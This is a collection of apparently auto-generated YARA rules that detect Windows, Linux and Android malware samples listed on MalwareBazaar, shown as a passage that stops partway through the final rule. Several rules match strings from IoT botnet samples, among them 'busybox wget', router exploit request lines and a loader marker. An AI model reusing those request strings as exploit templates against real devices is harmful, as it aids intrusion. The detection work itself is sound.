rule Windows_001f940536b97e346bbec3d23943128172f9b80adc7f55cf59928206f3e0eb35
{
    meta:
        description = "Auto ML: 001f940536b97e346bbec3d23943128172f9b80adc7f55cf59928206f3e0eb35"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "GetModuleHandleA"
        $s7 = "USER32.dll"
        $s8 = "GetProcessWindowStation"
        $s9 = "ExitProcess"
        $s10 = "GetModuleFileNameW"
        $s11 = "ADVAPI32.dll"
        $s12 = "LoadLibraryA"
        $s13 = "ShellExecuteA"
        $s14 = "gdiplus.dll"
        $s15 = "SHELL32.dll"
        $s16 = "SETUPAPI.dll"
        $s17 = "CRYPT32.dll"
        $s18 = "GetProcessAffinityMask"
        $s19 = "GetSystemMetrics"
        $s20 = "KERNEL32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6084KB and
        all of them
}

rule Linux_011b0363e2b125d98402378784d98d848aab0d8a79136a1da0379871228508af
{
    meta:
        description = "Auto ML: 011b0363e2b125d98402378784d98d848aab0d8a79136a1da0379871228508af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB and
        all of them
}

rule Windows_0e4ae06cb5ecca430d104edf89eaf6898a84a310e9951862ac6c953826856728
{
    meta:
        description = "Auto ML: 0e4ae06cb5ecca430d104edf89eaf6898a84a310e9951862ac6c953826856728"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "WriteUInt64"
        $s6 = "GetAsUInt64"
        $s7 = "SetAsUInt64"
        $s8 = "<Module>"
        $s9 = "ES_SYSTEM_REQUIRED"
        $s10 = "get_FormatID"
        $s11 = "get_ASCII"
        $s12 = "System.IO"
        $s13 = "ReadServertData"
        $s14 = "System.Collections.Generic"
        $s15 = "get_SendSync"
        $s16 = "EndRead"
        $s17 = "BeginRead"
        $s18 = "Thread"
        $s19 = "Load"
        $s20 = "get_Connected"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB and
        all of them
}

rule Windows_8ec4a944f9be73731c55274731bfb2a1fefe13cb6a4c688d013104467aabe170
{
    meta:
        description = "Auto ML: 8ec4a944f9be73731c55274731bfb2a1fefe13cb6a4c688d013104467aabe170"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "sypbdjojrgpthq.dll"
        $s6 = "GiupGDadaGrekiurVHrIiHHrahXIovKmEFbyyLLEFFvEruCmMYilIGlyaCPYfRoevFZfHwsKvnCcMDzg"
        $s7 = "QeLRQQlRtgetLMWTnHhXiXpEwQECVeOpimxUnDfKEcifbLpQgiyRWhjspHUAMjwOSoLZOB"
        $s8 = "xtZPwZOOrPxnurCqbCmdCLmUyBEzWVXvLMevSpLPvdNyRsJmQKnklIRlGERuUOrWsCbiMHYlqXhZxoCFr"
        $s9 = "aQqOXEbYdNllwiKvmOFfaswxdtchpaXjehuaseTxWNQXZNJToaxPJNWiTskecujDpBHPojDHuHJMbYYQjJsOcIaRKLGzup"
        $s10 = "YlvKNFkgpoLZAwEzrVVdmeDqmwiNdKChtYqGrHkvzTfVSnJdYrFNZmhthEYQWXD"
        $s11 = "pcmdncYNmcZZWEoMmjcQdZoV"
        $s12 = "CmDQGVcNUQqtkCwcTwoFRctFHvXzaavUceLkLIriGCanhhfPAqZ"
        $s13 = "VgigDmoArZsESsetupyneTXZSDDUoVuNhIzRfPuGNTdNgsuBCxFSTrNBJIOAiTMVffXKtNNeusZLpJtZICSqQbtpuxHW"
        $s14 = "tNxLrxYfoxgAJZWWGsuvXatBkbpVrusEtwyVHrnKSlkcVzDBptcRUNASUwbPICnuFbGMbBOOEjclqQglXofxRakfvgBKQ"
        $s15 = "aLZzWvUicGQkjfMYWRBDgtIvWinhhxcnzovJBSvPxCKGkUOCqqKGXOKhDe"
        $s16 = "fNZKfZgTIlPDnWAmOHTpLwlyfiPJeFXMfcVLQOnUgetgoHzguzPEswnjcbewJWpCNDXLBoWzTyJhCEJXijPfqTTjomjoj"
        $s17 = "tJzhIwinoGdyetpZnPjVClJqXFlkRrNQcXdWXTzlLAyvBTwQoLTCHvnIAIJDKxVxsMWHPTBTQxKBmNpDIUwGXLJgjVVPJwaN"
        $s18 = "AddsetTCklaTflHInxicYGvkRy"
        $s19 = "System"
        $s20 = "GetConsoleWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 225KB and
        all of them
}

rule Windows_8ec50ee4a15519c0be0d0f8f65f9d8d4f13a98e6b72c9e0eeabc4d984524d213
{
    meta:
        description = "Auto ML: 8ec50ee4a15519c0be0d0f8f65f9d8d4f13a98e6b72c9e0eeabc4d984524d213"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 991KB and
        all of them
}

rule Linux_8ec9dfa52e933ed9a8a7b3a64f0f540ed655ea99c3c650d14d5539f772b90788
{
    meta:
        description = "Auto ML: 8ec9dfa52e933ed9a8a7b3a64f0f540ed655ea99c3c650d14d5539f772b90788"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 26KB and
        all of them
}

rule Windows_8edd936e952bca539ce6511f2718aaa7d93ac0d3e0d15958f6abda24b4c3b804
{
    meta:
        description = "Auto ML: 8edd936e952bca539ce6511f2718aaa7d93ac0d3e0d15958f6abda24b4c3b804"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "DeleteFileW"
        $s8 = "FindFirstFileW"
        $s9 = "FindNextFileW"
        $s10 = "FindClose"
        $s11 = "SetFilePointer"
        $s12 = "ReadFile"
        $s13 = "GetPrivateProfileStringW"
        $s14 = "WritePrivateProfileStringW"
        $s15 = "LoadLibraryExW"
        $s16 = "GetModuleHandleW"
        $s17 = "CloseHandle"
        $s18 = "SetFileTime"
        $s19 = "CompareFileTime"
        $s20 = "GetShortPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1605KB and
        all of them
}

rule Windows_8ee4ea585c3ee9b147b068a8051494017540f9e6052ff79266bf9ef47056956a
{
    meta:
        description = "Auto ML: 8ee4ea585c3ee9b147b068a8051494017540f9e6052ff79266bf9ef47056956a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "http/1.1"
        $s7 = "http/1.1H;D$9u"
        $s8 = "?USERu"
        $s9 = "GL_EXT_memory_object_win32"
        $s10 = "GL_EXT_polygon_offset"
        $s11 = "GL_EXT_polygon_offset_clamp"
        $s12 = "GL_EXT_read_format_bgra"
        $s13 = "GL_EXT_sRGB_write_control"
        $s14 = "GL_EXT_semaphore_win32"
        $s15 = "GL_EXT_shader_image_load_formatted"
        $s16 = "GL_EXT_shader_image_load_store"
        $s17 = "GL_EXT_vertex_array_setXXX"
        $s18 = "GL_EXT_win32_keyed_mutex"
        $s19 = "GL_EXT_window_rectangles"
        $s20 = "GL_INGR_interlace_read"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1846KB and
        all of them
}

rule Windows_8f44201b56398e30425dab3f99cda8c490e3b4ded5f8d545de18f779f1feb6e9
{
    meta:
        description = "Auto ML: 8f44201b56398e30425dab3f99cda8c490e3b4ded5f8d545de18f779f1feb6e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "E  To add or remove a member, edit your .resx file then rerun MSBuild."
        $s6 = "B  Overrides the current thread's CurrentUICulture property for all"
        $s7 = "dMSB3464: The TargetPath parameter must be specified if the target directory needs to be overwritten."
        $s8 = "TMSB3463: The TargetPath parameter must be specified if the application is updatable."
        $s9 = "EMSB3001: Cannot extract culture information from file name \"{0}\". {1}"
        $s10 = ",Culture of \"{0}\" was assigned to file \"{1}\"."
        $s11 = "<MSB3656: No input file has been passed to the task, exiting."
        $s12 = "AMSB3646: Cannot specify values for both KeyFile and KeyContainer."
        $s13 = "SMSB3647: DelaySign parameter is true, but no KeyFile or KeyContainer was specified."
        $s14 = "SMSB3649: The KeyFile path '{0}' is invalid. KeyFile must point to an existing file."
        $s15 = "gMSB3650: Neither SDKToolsPath '{0}' nor ToolPath '{1}' is a valid directory.  One of these must be set."
        $s16 = "GMSB3652: The key file '{0}' does not contain a public/private key pair."
        $s17 = "MSB3654: Delay signing requires that at least a public key be specified.  Please either supply a public key using the KeyFile or KeyContainer properties, or disable delay signing."
        $s18 = "sMSB3653: AxTlbBaseTask is not an executable task. If deriving from it, please ensure the ToolName property was set."
        $s19 = "kMSB3752: The \"{0}\" attribute has been set but is empty. If the \"{0}\" attribute is set it must not be empty."
        $s20 = "uMSB3755: Could not find reference \"{0}\". If this reference is required by your code, you may get compilation errors.\""
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 772KB and
        all of them
}

rule Linux_8f521e02c757b114ab91ad79addd1890364f9b1e952b683c2460e1fbe8854278
{
    meta:
        description = "Auto ML: 8f521e02c757b114ab91ad79addd1890364f9b1e952b683c2460e1fbe8854278"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 37KB and
        all of them
}

rule Windows_8f61baa94fb46ff25bc93262bb7cf370f22914d8e97d3546fd70f69c7cd06eaf
{
    meta:
        description = "Auto ML: 8f61baa94fb46ff25bc93262bb7cf370f22914d8e97d3546fd70f69c7cd06eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "8HDFED.exe"
        $s6 = "System"
        $s7 = "System.Runtime.CompilerServices"
        $s8 = "System.Diagnostics"
        $s9 = "ProcessStartInfo"
        $s10 = "set_FileName"
        $s11 = "set_Arguments"
        $s12 = "ProcessWindowStyle"
        $s13 = "set_WindowStyle"
        $s14 = "set_CreateNoWindow"
        $s15 = "Process"
        $s16 = "mscoree.dll"
        $s17 = "powershell"
        $s18 = "VarFileInfo"
        $s19 = "StringFileInfo"
        $s20 = "FileDescription"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB and
        all of them
}

rule Windows_8f6952d8695ee78e7c79808b37e18213d29fc67db10b4c7872259e153256195f
{
    meta:
        description = "Auto ML: 8f6952d8695ee78e7c79808b37e18213d29fc67db10b4c7872259e153256195f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_DjNH"
        $s6 = "System.Data"
        $s7 = "get_Magenta"
        $s8 = "Form1_Load"
        $s9 = "add_Load"
        $s10 = "Login_Load"
        $s11 = "txtUser_TextChanged"
        $s12 = "get_Checked"
        $s13 = "set_Checked"
        $s14 = "set_DataSource"
        $s15 = "set_AutoScaleMode"
        $s16 = "set_AutoSizeMode"
        $s17 = "set_ColumnHeadersHeightSizeMode"
        $s18 = "set_Image"
        $s19 = "set_Visible"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 858KB and
        all of them
}

rule Windows_8f9c9b00fc65ab0f943bace26a7c2f921f5eebb04bcfa8fb33708c8fc7358be5
{
    meta:
        description = "Auto ML: 8f9c9b00fc65ab0f943bace26a7c2f921f5eebb04bcfa8fb33708c8fc7358be5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB and
        all of them
}

rule Linux_0e7d08b6fb10ab0cde7281fc25962710608a9fc1508c7e3593194d768e48331d
{
    meta:
        description = "Auto ML: 0e7d08b6fb10ab0cde7281fc25962710608a9fc1508c7e3593194d768e48331d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 149KB and
        all of them
}

rule Windows_8fac886c8726f7232be7b4d5e0c75c01376b606941c7ca9e5789d8e642a76d4d
{
    meta:
        description = "Auto ML: 8fac886c8726f7232be7b4d5e0c75c01376b606941c7ca9e5789d8e642a76d4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 8031KB and
        all of them
}

rule Linux_8fba1858e0b6e9d822cd380b8bd5b738e0e65531ae308a4dee61b8fcf5196d40
{
    meta:
        description = "Auto ML: 8fba1858e0b6e9d822cd380b8bd5b738e0e65531ae308a4dee61b8fcf5196d40"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB and
        all of them
}

rule Linux_8fc71a29a61edcb72913fc03a5477b43d414b1d854f8d9d784cf79a508c82ed6
{
    meta:
        description = "Auto ML: 8fc71a29a61edcb72913fc03a5477b43d414b1d854f8d9d784cf79a508c82ed6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 197KB and
        all of them
}

rule Windows_9024a473b6244e9aef3f65da784300194ff67434a204b445e5099ea80c19f949
{
    meta:
        description = "Auto ML: 9024a473b6244e9aef3f65da784300194ff67434a204b445e5099ea80c19f949"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 205KB and
        all of them
}

rule Linux_90631e8f2658ee4c8030fa20aa99f294036e47877beb6ad72dff5aa5932e7807
{
    meta:
        description = "Auto ML: 90631e8f2658ee4c8030fa20aa99f294036e47877beb6ad72dff5aa5932e7807"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system/bin/linker"
        $s2 = "__aeabi_unwind_cpp_pr0"
        $s3 = "open"
        $s4 = "write"
        $s5 = "close"
        $s6 = "read"
        $s7 = "__aeabi_unwind_cpp_pr1"
        $s8 = "getenv"
        $s9 = "readdir"
        $s10 = "opendir"
        $s11 = "Failed to open /proc? kill adbd manually... somehow"
        $s12 = "/cmdline"
        $s13 = "Failed to open cmdline for pid %s"
        $s14 = "Failed to read cmdline for pid %s"
        $s15 = "xoffset: %d"
        $s16 = "yoffset: %d"
        $s17 = "An error has occurred retrieving system information."
        $s18 = "Buffer offset:      %08x"
        $s19 = "Unable to open dump log file."
        $s20 = "Payload verification failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 10KB and
        all of them
}

rule Android_90c41e52f5ac57b8bd056313063acadc753d44fb97c45c2dc58d4972fe9f9f21
{
    meta:
        description = "Auto ML: 90c41e52f5ac57b8bd056313063acadc753d44fb97c45c2dc58d4972fe9f9f21"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "//res/drawable-hdpi/common_full_open_on_phone.png"
        $s2 = "00res/drawable-xhdpi/common_full_open_on_phone.png"
        $s3 = "Get Google Play services"
        $s4 = "Open on phone"
        $s5 = "assets/me_module_list"
        $s6 = "assets/countrylist/country_en.json]UMs"
        $s7 = "assets/grs_sp.bksc```b``"
        $s8 = "assets/grs_sdk_global_route_config_opendevicesdk.json"
        $s9 = "assets/listEntity.json"
        $s10 = "assets/eypqs/tjipfrd.ljp"
        $s11 = "res/drawable-hdpi/common_full_open_on_phone.png"
        $s12 = "assets/mxad_admark.png"
        $s13 = "assets/shader/unsharp_edge_compare_fragment.sh"
        $s14 = "assets/grs_sdk_server_config.json"
        $s15 = "assets/MgmiWebViewJavascriptBridge.js"
        $s16 = "assets/countrylist/country_thai.json"
        $s17 = "assets/hmsrootcas.bks"
        $s18 = "assets/supplierconfig.json"
        $s19 = "assets/countrylist/country_malay.jsoneTMs"
        $s20 = "assets/shader/unsharp_edge_fragment.sh"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 3282KB and
        all of them
}

rule Windows_90c757f5291c89a9f86ac63c59868538f3dea52b0d8555ec1445f63e50e219a3
{
    meta:
        description = "Auto ML: 90c757f5291c89a9f86ac63c59868538f3dea52b0d8555ec1445f63e50e219a3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "libgcc_s_dw2-1.dll"
        $s7 = "Error, failed to open '%ls' for writing."
        $s8 = "Error, couldn't unpack file to target path."
        $s9 = "NUITKA_ONEFILE_PARENT"
        $s10 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p."
        $s11 = "CloseHandle"
        $s12 = "CopyFileW"
        $s13 = "CreateDirectoryW"
        $s14 = "CreateFileMappingW"
        $s15 = "CreateFileW"
        $s16 = "CreateProcessW"
        $s17 = "DeleteCriticalSection"
        $s18 = "DeleteFileW"
        $s19 = "GetCommandLineW"
        $s20 = "GetCurrentProcessId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10939KB and
        all of them
}

rule Windows_90dd210c9c67ffa0ecd9a20c1b76d0ecd2ee8669804d736b44a530ab818baec6
{
    meta:
        description = "Auto ML: 90dd210c9c67ffa0ecd9a20c1b76d0ecd2ee8669804d736b44a530ab818baec6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CWinApp"
        $s6 = "Settings"
        $s7 = "CWinThread"
        $s8 = "CCmdTarget"
        $s9 = "MS Shell Dlg"
        $s10 = "CTempWnd"
        $s11 = "GetMonitorInfoA"
        $s12 = "MonitorFromWindow"
        $s13 = "GetSystemMetrics"
        $s14 = "USER32"
        $s15 = "COMCTL32.DLL"
        $s16 = "CTempGdiObject"
        $s17 = "CTempDC"
        $s18 = "CWindowDC"
        $s19 = "CUserException"
        $s20 = "CTempMenu"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2146KB and
        all of them
}

rule Windows_90f43f41f50f5c7f266f9353d21c3733468bad8644be318d48568415a6d9b89b
{
    meta:
        description = "Auto ML: 90f43f41f50f5c7f266f9353d21c3733468bad8644be318d48568415a6d9b89b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "Runtime.exe"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "IGMPMessageType"
        $s7 = "System.Collections"
        $s8 = "System.Collections.ObjectModel"
        $s9 = "SystemName"
        $s10 = "SystemDescription"
        $s11 = "SystemCapabilities"
        $s12 = "System.Security.Cryptography"
        $s13 = "System.Collections.Generic"
        $s14 = "System.IO"
        $s15 = "System.Resources"
        $s16 = "System.Globalization"
        $s17 = "System.Text"
        $s18 = "payloadPacketOrData"
        $s19 = "SerialRealTimeCommunicationSystemIii"
        $s20 = "ConnectivityFaultManagementOrOperationsAdministrationManagement"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1474KB and
        all of them
}

rule Windows_9120ce3b64b1eea0eccc343744f4e8ff3bdc88b8a79743e07a975c6c313789ee
{
    meta:
        description = "Auto ML: 9120ce3b64b1eea0eccc343744f4e8ff3bdc88b8a79743e07a975c6c313789ee"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "SetProcessPreferredUILanguages"
        $s7 = "SetThreadPreferredUILanguages"
        $s8 = "GetNativeSystemInfo"
        $s9 = "SFX module - Copyright (c) 2005-2016 Oleg Scherbakov"
        $s10 = "Could not get SFX filename."
        $s11 = "Could not open archive file \"%s\"."
        $s12 = "Could not read SFX configuration or configuration not found."
        $s13 = "Could not write SFX configuration."
        $s14 = "Could not create folder \"%s\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not find \"setup.exe\"."
        $s17 = "\"setup.exe\""
        $s18 = "No \"HelpText\" in the configuration file."
        $s19 = "Could not create file \"%s\"."
        $s20 = "Could not overwrite file \"%s\"."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 1389KB and
        all of them
}

rule Linux_0e96ac537b36292f0271b501abc7abb8e511647b4e8dc314700e4a3f928f85fb
{
    meta:
        description = "Auto ML: 0e96ac537b36292f0271b501abc7abb8e511647b4e8dc314700e4a3f928f85fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s2 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s4 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s5 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s6 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s7 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s8 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s9 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s10 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s11 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
